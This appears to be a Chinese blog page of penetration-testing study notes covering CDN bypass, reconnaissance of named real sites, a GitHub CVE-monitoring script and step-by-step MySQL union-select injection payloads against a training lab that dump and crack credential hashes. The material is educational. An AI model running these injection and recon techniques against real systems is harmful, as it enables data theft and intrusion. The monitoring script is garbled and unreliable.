版权声明：本文为CSDN博主「ArthurKingYs」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/u011001084/article/details/90199446</p>
<h1 id="2021-09-15">2021-09-15</h1>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1631670532262.png" alt="" loading="lazy"></figure>
<p>#操作系统层面</p>
<p><strong>识别操作系统常见方法：</strong><br>
1)将网站大小写混用如果相同说明是windows服务器搭建的否则就是linux，<br>
2)用nmap识别，<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631672684636.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631672689303.png" alt="" loading="lazy"><br>
3)TTL值来判断(不太准确一般不建议)<br>
(ping一下Linux系统的TTL值为64或255，<br>
Windows NT/2000/XP系统的TTL值为128，<br>
Windows 98系统的TTL值为32，<br>
UNIX主机的TTL值为255。)，</p>
<p><strong>2.简要两者区别及识别意义</strong><br>
1)首先盘的分布不一样<br>
2)文件放在不同的系统上所展现出来的也不一样<br>
3)识别的意义就是按照操作系统的不一样来运用不同的漏洞来作进一步的测试</p>
<p><strong>3.操作系统层面漏洞类型对应意义</strong><br>
1)操作系统漏洞分类</p>
<p>不同角度看安全漏洞的分类，对一个特定程序的安全漏洞可以从多方面进行分类。</p>
<p>操作系统漏洞分类1、从作用范围角度看分为</p>
<p>●远程漏洞，攻击者可以利用并直接通过网络发起攻击的漏洞。这类漏洞危害极大，攻击者能随心所欲的通过此漏洞操作他人的电脑。并且此类漏洞很容易导致蠕虫攻击，在Windows。</p>
<p>●本地漏洞，攻击者必须在本机拥有访问权限前提下才能发起攻击的漏洞。比较典型的是本地权限提升漏洞，这类漏洞在Unix系统中广泛存在，能让普通用户获得最高管理员权限。</p>
<p>操作系统漏洞分类2、从用户群体分类</p>
<p>●大众类软件的漏洞。如Windows的漏洞、IE的漏洞等等。</p>
<p>●专用软件的漏洞。如Oracle漏洞、Apache漏洞等等。</p>
<p>操作系统漏洞分类3、从数据角度看分为</p>
<p>●能读按理不能读的数据，包括内存中的数据、文件中的数据、用户输入的数据、数据库中的数据、网络上传输的数据等等。</p>
<p>●能把指定的内容写入指定的地方(这个地方包括文件、内存、数据库等)</p>
<p>●输入的数据能被执行(包括按机器码执行、按Shell代码执行、按SQL代码执行等等)</p>
<p>操作系统漏洞分类4、从触发条件上看可以分为</p>
<p>●主动触发漏洞，攻击者可以主动利用该漏洞进行攻击，如直接访问他人计算机。</p>
<p>●被动触发漏洞，必须要计算机的操作人员配合才能进行攻击利用的漏洞。比如攻击者给管理员发一封邮件，带了一个特殊的jpg图片文件，如果管理员打开图片文件就会导致看图软件的某个漏洞被触发，从而系统被攻击，但如果管理员不看这个图片则不会受攻击。</p>
<p>操作系统漏洞分类5、从操作角度看可分为</p>
<p>●文件操作类型，主要为操作的目标文件路径可被控制(如通过参数、配置文件、环境变量、符号链接灯)，这样就可能导致下面两个问题：</p>
<p>◇写入内容可被控制，从而可伪造文件内容，导致权限提升或直接修改重要数据(如修改存贷数据)，这类漏洞有很多，如历史上Oracle TNS LOG文件可指定漏洞，可导致任何人可控制运行Oracle服务的计算机;</p>
<p>◇内容信息可被输出，包含内容被打印到屏幕、记录到可读的日志文件、产生可被用户读的core文件等等，这类漏洞在历史上Unix系统中的crontab子系统中出现过很多次，普通用户能读受保护的shadow文件;</p>
<p>●内存覆盖，主要为内存单元可指定，写入内容可指定，这样就能执行攻击者想执行的代码(缓冲区溢出、格式串漏洞、PTrace漏洞、历史上Windows2000的硬件调试寄存器用户可写漏洞)或直接修改内存中的机密数据。</p>
<p>●逻辑错误，这类漏洞广泛存在，但很少有范式，所以难以查觉，可细分为：</p>
<p>◇条件竞争漏洞(通常为设计问题，典型的有Ptrace漏洞、广泛存在的文件操作时序竞争)</p>
<p>◇策略错误，通常为设计问题，如历史上FreeBSD的Smart IO漏洞。</p>
<p>◇算法问题(通常为设计问题或代码实现问题)，如历史上微软的Windows 95/98的共享口令可轻易获取漏洞。</p>
<p>◇设计的不完善，如TCP/IP协议中的3步握手导致了SYN FLOOD拒绝服务攻击。</p>
<p>◇实现中的错误(通常为设计没有问题，但编码人员出现了逻辑错误，如历史上博彩系统的伪随机算法实现问题)</p>
<p>●外部命令执行问题，典型的有外部命令可被控制(通过PATH变量，输入中的SHELL特殊字符等等)和SQL注入问题。</p>
<p>操作系统漏洞分类6、从时序上看可分为</p>
<p>●已发现很久的漏洞：厂商已经发布补丁或修补方法，很多人都已经知道。这类漏洞通常很多人已经进行了修补，宏观上看危害比较小。</p>
<p>●刚发现的漏洞：厂商刚发补丁或修补方法，知道的人还不多。相对于上一种漏洞其危害性较大，如果此时出现了蠕虫或傻瓜化的利用程序，那么会导致大批系统受到攻击。</p>
<p>●0day：还没有公开的漏洞，在私下交易中的。这类漏洞通常对大众不会有什么影响，但会导致攻击者瞄准的目标受到精确攻击，危害也是非常之大。</p>
<p><strong>影响范围</strong><br>
1)和权限挂钩，以便进一步进行相关渗透，或者就是简单的崩溃一下</p>
<h1 id="数据库层面">数据库层面</h1>
<p><strong>1.识别数据库类型常见方法</strong><br>
1)首先通过网站来识别数据库（asp+access，aspx+mssql，jsp+mssql | oracle，python+mongodb，php+mysql）<br>
2)端口扫描用nmap扫描操作系统时会出现响应端口以及状态(filtered由于报文无法到达指定的端口，open是开放，nmap不能够决定端口的开放状态)</p>
<h1 id="补充">补充</h1>
<p>出去常规web安全及app安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，附在均衡），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题，</p>
<h1 id="2021-09-23">2021-09-23</h1>
<p>#CDN的相关技术<br>
<strong>如何判断目标存在CDN服务?</strong><br>
通过ping.chinaz.com来看是否返回的地址都一样如果一样的话就说明没有cdn，如果不一样的话就说明存在相关技术<br>
利用多节点技术进行请求返回判断</p>
<p><strong>CDN对于安全测试有那些影响?</strong><br>
如果扫描的网站使用了cdn技术，那我们直接访问的可能不是对方的真实iIP，而是缓存服务器，即访问其真实服务器的时候会受到阻碍</p>
<p><strong>目前常见的CDN绕过技术有哪些?</strong><br>
子域名查询：网站管理者可能只在www.xxx.com设置了cdn服务，而在xxx.com没有设置cdn服务，可以使用超级ping进行验证：ping.chinaz.com</p>
<p>邮件服务查询：很多公司有自己的邮箱服务器，而邮箱服务器绝大多数不会设置cdn服务，可以通过给自己发送的邮件然后通过查看源码即可知道</p>
<p>国外地址请求：某些国家可能没有cdn服务器</p>
<p>遗留文件，扫描全网：通过访问遗留文件，可能发现其真实ip</p>
<p>黑暗引擎搜索特定文件：fofa、zoomeye、Shodan</p>
<p>dns历史记录，以量打量：查询以前还未设置CDN服务的IP地址；采用ddos攻击，通过消耗节点的IP地址，然后达到最后访问真实IP地址的情况。</p>
<p>CDN真实lP地址获取后绑定指向地址：当获取有可能的IP地址的时候通过修改本地hosts解析指向文件</p>
<p>更改木地HOST:解析指向文件</p>
<p>演示案例：<br>
1.利用子域名请求获取真实IP<br>
ping www.xuersi.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361964561.png" alt="" loading="lazy"><br>
ping xuersi.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361970513.png" alt="" loading="lazy"></p>
<p>2.利用国外地址请求获取真实ip（https://get-site-ip.com/ 查询 www.xueersi.com ）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361975125.png" alt="" loading="lazy"></p>
<p>3.利用第三方接口查询获取真实ip（https://get-site-ip.com）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361978600.png" alt="" loading="lazy"></p>
<p>4.利用邮件服务器接口获取真实ip<br>
以墨者学院注册邮件为例<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361983761.png" alt="" loading="lazy"></p>
<p>怎么通过邮件查询对方IP地址<br>
https://jingyan.baidu.com/article/c85b7a640c84d6003bac9527.html<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361987838.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361992202.png" alt="" loading="lazy"><br>
如何确定他的IP就是上述的IP呢？</p>
<p>(1)有人情味的方法:查备案地址、备案号<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361996144.png" alt="" loading="lazy"><br>
基本上可以确定其重庆的这个IP</p>
<p>(2) 通过修改本地host文件进行验证</p>
<p>思路：将我们想要测试的IP地址添加到host文件中进行测试，如果浏览器能打开这个网址，这个IP可能是我们要找的真实IP；如果不可以，就一定不是。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361999939.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632362005735.png" alt="" loading="lazy"></p>
<p>6.5 利用黑暗引擎搜索特定文件获取真实IP<br>
shodan</p>
<h1 id="2021-09-26">2021-09-26</h1>
<h1 id="信息收集-app及其他资产等">信息收集-app及其他资产等</h1>
<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1632612888336.png" alt="" loading="lazy"></figure>
<p>APP提取一键反编译提取</p>
<p>APP抓取数据包进行工具配合</p>
<p>各种第三方应用相关探针技术</p>
<p>各种服务接口信息相关探针技术</p>
<p>设计案例<br>
<strong>1.app提取及抓包及后续配合</strong><br>
某apk一键提取反编译（https://blog.csdn.net/afanbaby/article/details/76756109）<br>
利用burp历史抓更多url</p>
<p>每个数据包截断查看<br>
反编译查出来（少，不全）的url和burp查看的历史结合，找出更多的url</p>
<p><strong>2.某ip无web框架下的第三方测试</strong><br>
各种端口一顿乱扫-思路<br>
各种接口一顿乱扫-思路<br>
接口部分一顿乱扫-思路</p>
<p>45.33.42.112<br>
1.端口扫描：nmap，结果最好，但是满，网速慢，运行速度慢<br>
2.黑暗引擎搜索强大的引擎，开放的端口，端口可能对应的服务都能检测出来，shodan，钟馗之眼，fofa<br>
628端口admin，intel远程管理技术，（如果能在管理用户上添加一个新账号，在远程访问获取服务器权限）</p>
<p><strong>3.群友web授权测试下的服务测试</strong></p>
<p>目标：凯儿得乐网站<br>
工具：shodan，fofa<br>
站长工具，端口扫描工具nmap<br>
操作时：搜索引擎看信息，<br>
nmap看端口信息，<br>
资产信息，旁注，类似域名，子域名等进行搜索和查端口</p>
<p>1.从黑暗引擎搜索开始：<br>
搜索caredaily.com这样找的多<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614397961.png" alt="" loading="lazy"><br>
根据搜索结果的信息：子域名，ip端口（ipenssh ,odb数据库，ftp协议）</p>
<p>2.使用nmap：openssh6版本，iis-http6.0<br>
在搜索引擎上可以找到很多信息，比如后台等等<br>
更具开放的端口对应的协议版本，可能有着一些曾经未完善的漏洞如openssh6.6，7版本下就有着远程代码执行的漏洞，搜索引擎并不全面，会偶一楼，再结合端口扫描，有什么用什么</p>
<p>查找子域名<br>
1.手动百度搜索：site:caredaily.com（site：把搜索范围限定在特定站点中）<br>
2.子域名查找工具：在线自己找<br>
子域名对应着的新的ip，可以对子域名和ip在进行引擎搜索和端口扫描</p>
<p>旁注<br>
旁注查询，找在线工具，查到域名或ip还是进行以上两种操作</p>
<p>类似域名：<br>
1.子域名查询：查找后缀不一样的域名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614526812.png" alt="" loading="lazy"><br>
2.备案查询：找到的另外的域名（一般得花钱，还是换一个吧）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614582686.png" alt="" loading="lazy"><br>
以上备案的其他网址找到了含有一堆网站的页面，含有丰富的信息</p>
<p>对于其他业务域名，可以在主页面上点一点找一找<br>
对于不良网站可能经常更换域名等，可以再对网站的以下标题进行搜索（百度谷歌交替用一用）蒂迪师傅演示找到了之前浏览器缓存的原始版本的网站，或者也可以搜索域名关键字caredaily等</p>
<p>信息收集是个繁琐和必要的工作，信息做好记录（他根据网站后追查到网站源码类型，去尝试登陆后台）。一步步爬吧</p>
<h1 id="2021-09-26-2">2021-09-26</h1>
<h1 id="信息收集-资产监控拓展">信息收集-资产监控拓展</h1>
<p>Github监控<br>
便于收集整理最新exp或poc<br>
便于发现相关测试目标的资产<br>
如何使用（为什么使用这个技术？意识官方的ctms是需要收费的，我们可以通过监控GitHub来找到类似的源码，二是在GitHub官网上有着最细腻的检测漏洞报告）<br>
首先将下面的内部接口放在pycharm中，安装所对应的脚本所需的库，即import后面的东西<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622937384.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622940629.png" alt="" loading="lazy"><br>
接着在GitHub注册，在https://scr.ftqq.com/威胁你登录后获取SendKey，在脚本中进行更改<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622944031.png" alt="" loading="lazy"></p>
<p>绑定微信，运行脚本，就可以获取到监控的内容，以下是监控内容的填写位置<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622947669.png" alt="" loading="lazy"></p>
<p>网站只能绑定企业微信，甭能作到手机上也收到推送，后续会处理这个问题</p>
<p>各种子域名查询<br>
DNS，备案，证书<br>
全球结点请求cdn<br>
枚举爆破或解析子域名对应<br>
便于发现管理员相关的注册信息</p>
<p>黑暗引擎相关搜索fofa，shodan，zoomeye<br>
微信公众号接口获取<br>
内部群内部应用内部接口</p>
<pre><code># Title: wechat push CVE-2020
# Date: 2020-5-9
# Exploit Author: weixiao9188
# Version: 4.0
# Tested on: Linux,windows
# cd /root/sh/git/ &amp;&amp; nohup python3 /root/sh/git/git.py &amp;
# coding:UTF-8

import requests
import json
import time
import os
import pandas as pd
time_sleep = 60 #每隔 20 秒爬取一次
while(True):
headers1 = {
	&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;}
#判断文件是否存在
datas = []
response1=None
response2=None
if os.path.exists(&quot;olddata.csv&quot;):
#如果文件存在则每次爬取 10 个
	df = pd.read_csv(&quot;olddata.csv&quot;, header=None)
	datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的 nan 转化为 None
	requests.packages.urllib3.disable_warnings()
	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-
2020&amp;sort=updated&amp;per_page=10&quot;,headers=headers1,verify=False)
	response2 =
requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,hea
ders=headers1,verify=False)
else:
#不存在爬取全部
	datas = []
	requests.packages.urllib3.disable_warnings()
	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
	response2 =
requests.get(url=&quot;https://api.github.com/search/repositories?q=ctcms&amp;ssort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
                    
data1 = json.loads(response1.text)
data2 = json.loads(response2.text)
for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:
	for i in j:
	s = {&quot;name&quot;:i['name'],&quot;html&quot;:i['html_url'],&quot;description&quot;:i['description']}
	s1 =[i['name'],i['html_url'],i['description']]
if s1 not in datas:
#print(s1)
#print(datas)
params={
&quot;text&quot;:s[&quot;name&quot;],
&quot;desp&quot;:&quot;链接:&quot;+str(s[&quot;html&quot;])+&quot;\n简介&quot;+str(s[&quot;description&quot;])
}
print(&quot;当前推送为&quot;+str(s)+&quot;\n&quot;)
#print(params)
request.packages.urllib3.disable_warnings()
request.get(&quot;https://sct.ftqq.com/SendKey填写处.send&quot;, params=params,headers=headers1,timeout=10,verify=False)
time.sleep(1)#以防推送太快
print(&quot;推送成功！\n&quot;)
datas.append(s1)
else:
pass
print(&quot;数据已经存在！&quot;)
pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=Nonne,Index=None)   
time.sleep(time_sleep)
</code></pre>
<p>黑暗引擎实现域名端口等收集<br>
https://fofa.so/</p>
<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1632622960599.png" alt="" loading="lazy"></figure>
<p>全自动域名手机美剧优秀脚本使用（teemo）<br>
以xxxx为例，从标题，域名等收集</p>
<p>以xxxx为例，全自动脚本使用收集<br>
配置过程<br>
首先，我们需要在github下载后，解压文件后将文件放进python里面，然后在teemo这个文件下新建cmd.bat(里面的内容是cmd.exe)<br>
接着我们找到python2（过期了？导致后续配置还未完成，以下截图来源小迪视频）中的script文件夹，将其中的pip.exe拉入命令行中，输入以下命令<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622964707.png" alt="" loading="lazy"></p>
<p>接着将python拖入命令行界面，输入以下命令，开启teemo<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622974248.png" alt="" loading="lazy"></p>
<p>输入以下命令（-d ＋ 域名），进行子域名查询<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622977868.png" alt="" loading="lazy"></p>
<p>查询的结果放在以下文件夹中，以其名称命名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622981754.png" alt="" loading="lazy"></p>
<p>或者似乎用layer子域名挖掘机直接进行扫描</p>
<p>SRC目标中的信息收集全覆盖<br>
补天上专属src建议测试<br>
利用其他第三方接口获取更多信息</p>
<p>涉及资源<br>
https://crt.sh/ （查网站证书的）<br>
https://sct.ftqq.com/</p>
<p>https://dnsdb.io/zh-cn/ （详细的DNS解析记录）</p>
<p>https://sct.ftqq.com/3.version</p>
<p>https://tools.ipip.net/cdn.php （国外访问国内地址获取网站真实IP地址，之前cdn的知识）</p>
<p>https://github.com/bit4woo/teemo</p>
<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）</p>
<p>前cdn的知识）</p>
<p>https://github.com/bit4woo/teemo</p>
<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）<br>
————————————————<br>
版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45889197/article/details/119299883</p>
<h1 id="2021-9-28">2021-9-28</h1>
<h1 id="基础入门-加密编码算法">基础入门-加密编码算法</h1>
<p>常见加密编码等算法解析：<br>
MD5，SHA，ASC，进制时间戳，URL，BASE64，Unescape，AES，DES等</p>
<p>MD5：十六位和三十二位，加密密文字符串都是由A-Z，0-9随机分配，百分之八十的网站管理员或用户密码采取MD5加密。（不可逆）<br>
SHA：由A-Z，0-9随机组合，SHA1,SHA256,SHA384,SHA512,长度固定（不可逆）<br>
进制：碰上的机会不是很大<br>
时间戳：网站或者服务器脚本语言里经常会使用，会在数据库用户登录和注销，注册里会使用<br>
URL：浏览器只做一次加密，在渗透绕过的时候可能会使用二次，或者三次加密方式<br>
BASE64：由A-Z,0-9，A-Z区分大小写，长度固定，长度随密文长度一次增加，经常在字符串后按出现一个&quot;=&quot;或者&quot;==&quot;.常见的代码里，密码，参数值，在WEB应用中<br>
Unescape：%u+4位数字，对应两位字符，主要应用web应用中<br>
AES：是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性，解密的难度打。用base64揭秘出来的是乱码，有很大可能是aes加密，有时候出现在字符串里面，比较著汇总安全和大型网站，安全比赛<br>
DES：类似于base64，有时候+会出现字符串里</p>
<p>常见加密形式算法解析<br>
直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
<p>常见加密方式（针对）<br>
枚举，自定义你想算法，可逆向</p>
<p>了解常规加密算法的特性<br>
长度位数，字符规律，代码分析，搜索获取</p>
<p>演示：<br>
某CTF比赛题目解析<br>
脚本自定义算法组合逆向<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822312092.png" alt="" loading="lazy"></p>
<p>某CMS密码加密解密<br>
MD5+salt<br>
部分CMS密码加密形式-wp,dz等<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822359090.png" alt="" loading="lazy"></p>
<p>单纯用MD5节目是无法解密成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822612569.png" alt="" loading="lazy"></p>
<p>用MD5+salt<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822616362.png" alt="" loading="lazy"></p>
<p>解密成功。<code>md5(md5($pass)$salt)</code><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822620419.png" alt="" loading="lazy"><br>
某URL加密地址的漏洞测试<br>
AES+Base64+自定义<br>
观察参数值加密字符串，下载源代码分析，函数定义AES加密，设计模式CBC，128位，加密密码，偏移量，两次base64减去常规一次，填充模式。(因为在网站的AES解码中，有输出为base64，故只需解码base64一次)<br>
mozhe</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1632822625073.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822628185.png" alt="" loading="lazy"></p>
<p>下载list.zip<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822631723.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822634937.png" alt="" loading="lazy"></p>
<p>先进行base64解密<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822643659.png" alt="" loading="lazy"></p>
<p>再进行AES解密<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822647361.png" alt="" loading="lazy"></p>
<h1 id="2021-09-29">2021-09-29</h1>
<h1 id="web漏洞-sql注入之简要sql注入">WEB漏洞-sql注入之简要sql注入</h1>
<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1632874825579.png" alt="" loading="lazy"></figure>
<p><strong>SQL注入安全测试中危害</strong><br>
分为两类：危害数据库里的数据，直接危害到网站的权限（需满足条件）</p>
<p><strong>SQL注入产生原理详细分析</strong><br>
1.SQL语句在定义的时候没有变量，就不能进行SQL注入<br>
2.可控变量，可以通过其前端（例如post，get，request）进行更改变量，带入数据库查询<br>
3.变量不存在过滤或过滤不严谨</p>
<p><strong>可能存在注入的编号选项有哪几个？</strong><br>
www.xiaodi8.com/index.php?id=8<br>
www.xiaodi8.com/?id=10<br>
www.xiaodi8.com/?id=10&amp;x=1<br>
www.xiaodi8.com/index.php(post注入，看不见变量)</p>
<p><strong>参数有x注入，哪一个注入测试正确？bc</strong><br>
a.www.xiaodi8.com/new/php?y=1 and 1=1 &amp;x=2<br>
b.www.xiaodi8.com/new/php?y=1&amp;x=2 and 1=1<br>
c.www.xiaodi8.com/new/php?y=1 and 1=1&amp;x=2 and 1=1<br>
d.www.xiaodi8.com/new/php?xx=1 and 1=1&amp;xxx=2 and 1=1</p>
<p><strong>and 和or为逻辑判断</strong><br>
如果参数id存在注入点<br>
http://www/cnhgs.net/main.php?id53(注入点)&amp;page=1<br>
-&gt; http://www/cnhgs.net/main.php?page=1&amp;id53(注入点)</p>
<p>搭建第一个SQL诸如学习靶场环境<br>
Sqlilabs注入靶场</p>
<p>学习第一个数据库MYSQL简单注入<br>
MYSQL数据库<br>
数据库A=网站A=数据库用户A<br>
表名<br>
列名<br>
数据<br>
数据库B=网站B=数据库用户B<br>
。。。。。。<br>
数据库C=网站C=数据库用户C<br>
。。。。。。</p>
<p><strong>必要知识点</strong></p>
<p>1.在mysql5.0以上版本中，mysql存在一个自带数据库名为information_schema,他是一个存储记录所有数据库名，表名，列名，的数据库，也相当于可以通过查询它指定数据库下面的表名或者列名信息<br>
2.在数据库中符号&quot;&quot;代表下一级，如xiaodi.user表示xiaodi数据库下的user表名</p>
<p>information_schema.tables 记录所有表名信息的表<br>
information_schema.columns 记录所有列名信息的表<br>
table_name 表名<br>
column_name 列名<br>
table_schema 数据库名</p>
<p>如何判断注入点？<br>
老办法：<br>
and 1=1 页面正常<br>
and 1=2 页面错误<br>
可能存在注入点</p>
<p>好办法：<br>
SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 正常<br>
SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1 错误</p>
<p>逻辑运算符<br>
或 且 非<br>
or and xor<br>
真 且 真 = 真<br>
真 且 假 = 假<br>
真 或 假 = 真</p>
<p>SELECT * FROM users WHERE id=1 真<br>
1=1 真<br>
1=2 假</p>
<p>真且真=真<br>
真且假=假</p>
<p>SELECT * FROM users WHERE id=1 or 1=1 LIMIT 0,1 正常<br>
SELECT * FROM users WHERE id=1 or 1=2 LIMIT 0,1 正常<br>
不能用or判断<br>
为什么不能？<br>
是因为id=1为真的话，那么两个语句都为真是无法判断的，那如果id=1为假的话，可以用or进行判断</p>
<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1632876691869.png" alt="" loading="lazy"></figure>
<p><strong>要选用最舒服的方法测试</strong><br>
select * from users where id = 1asdsadsad（随便输入）limit 0,1<br>
随便输入后对网页有影响说明带入数据库进行查询有注入点，没有影响说明没有带入数据库查询，出现404错误说明对数据检测没有漏洞</p>
<p><strong>猜解列名数量（字段数）</strong><br>
order by x（数字）正常与错误的正常值<br>
正确的话网页正常显示，错误的话网页报错</p>
<p>http://219.153.49.228:43230/new_list.php?id=1 order by 4<br>
=select * from users where id =1 order by 4</p>
<p>网页正确说明有select搜索的是属性列个数为4</p>
<p><strong>报错猜解准备</strong><br>
http://219.153.49.228:43230/new_list.php?id=1 union select 1,2,3,4<br>
http://219.153.49.228:43230/new_list.php?id=-1%20union%20%20select%201,2,3,4<br>
或<br>
http://219.153.49.228:43230/new_list.php?id=1%20and%201=22222%20union%20%20select%201,2,3,4</p>
<p><strong>信息收集</strong><br>
数据库版本：version()           5.7.22-0ubuntu0.16.04.1<br>
数据库名字：database()          mozhe_Discuz_StormGroup<br>
数据库用户：user()                  root@localhost<br>
操作系统：@@version_compile_os      Linux</p>
<p>根据猜想的列数得到4所以union右边必须有的四个属性列<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,database(),version(),4<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,user(),@@version_compile_os,4</p>
<p><strong>查询指定数据库名</strong></p>
<p>mozhe_Discuz_StormGroup下的表名信息：<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
<p><strong>查询所有表名</strong></p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
<p><strong>查询指定表名的全部列名</strong></p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'</p>
<p><strong>查询指定数据</strong><br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member</p>
<p><strong>猜解多个数据</strong><br>
可以采用limit x,1 变动猜解<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1<br>
mozhe<br>
356f589a7df439f6f744ff19bb8092c0 MD5解密 dsan13</p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1<br>
mozhe<br>
a26f03bdd67bc4a815c2c30c6daf0ce3 MD5解密 959003</p>
<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1632876685293.png" alt="" loading="lazy"></figure>
<p>案例<br>
简易代码分析SQL注入原理<br>
接收数据 -&gt; 拼接数据 -&gt; 数据进数据库执行 -&gt; 展示结果</p>
<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1632876838728.png" alt="" loading="lazy"></figure>
<p>通过参数传递到拼接好的SQL语句中，由于是拼接语句就可以将一些恶意的SQL语句拼接到上面，来实现恶意的SQL语句执行的效果</p>
<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1632876842225.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1632876846630.png" alt="" loading="lazy"></figure>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119106593</p>
<h1 id="sql注入之mysql注入">SQL注入之MYSQL注入</h1>
<p>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的等直接进行getshell操作，其中也会遇到哼多的阻碍，相关方与手法也要明确，所谓知己知彼，百战不殆，作为俺去那开发工作者，攻防兼备。注入点权限是否为root，取决于连接数据库的文件，这也决定了高权限注入以及低权限注入</p>
<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1633431704175.png" alt="" loading="lazy"></figure>
<p>跨库查询及应用思路<br>
information_schema 表特性，记录库名，表名，列名对应表</p>
<p>获取所有数据库名<br>
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<p>查表，找与网站对应的数据库名，若没有，则挨个查。或者使用union select 1,2,database()<br>
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='qqyw'</p>
<p>跨库查列<br>
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='qqyw'</p>
<p>查结果<br>
?id=-1 union select 1,u,p from qqyw.admin</p>
<p><strong>文件读写操作</strong><br>
load_file():读取文件函数<br>
into outfile或者into dumpfile:导出函数<br>
路径获取常见方法：<br>
报错显示：(phpinfo.php) 遗留文件，漏洞报错，平台配置文件</p>
<p>常见读取文件列表：（需得知网站绝对路劲）<br>
union select 1,load_file('D://phpmyadmin//dudu.txt'),3</p>
